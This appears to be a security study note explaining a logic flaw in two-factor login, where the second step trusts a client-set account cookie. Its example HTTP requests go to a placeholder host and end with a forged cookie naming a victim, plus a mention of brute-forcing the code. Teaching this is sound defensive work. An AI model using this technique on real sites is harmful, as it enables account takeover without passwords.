# 09. Flawed two-factor verification logic

## 🚨 Logic Flaw in Two-Factor Authentication

> Sometimes flawed logic in two-factor authentication means that after a user completes the first login step, the website doesn't adequately verify that the same user is completing the second step.
> 

---

### 🧪 **Example Scenario**

1. 👤 The user logs in with normal credentials:

```
POST /login-steps/first HTTP/1.1
Host: vulnerable-website.com
...
username=carlos&password=qwerty

```

1. 🍪 They are assigned a cookie that relates to their account:

```
HTTP/1.1 200 OK
Set-Cookie: account=carlos

```

1. 👉 They're then taken to the second login step:

```
GET /login-steps/second HTTP/1.1
Cookie: account=carlos

```

1. 🔢 The verification code is submitted and the request uses this cookie to determine the account:

```
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=carlos
...
verification-code=123456

```

---

### 🧨 **Vulnerability**

In this flawed logic flow, an **attacker** can:

- Log in using **their own credentials**
- Then **change the value of the account cookie** to target **any arbitrary user** when submitting the 2FA code.

```
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=victim-user
...
verification-code=123456

```

---

### ⚠️ **Impact**

✅ This becomes **extremely dangerous** if the attacker can **brute-force the verification code**.

🚫 They would gain access to **any user's account** based solely on the username,

🔐 **without needing to know the user's password**.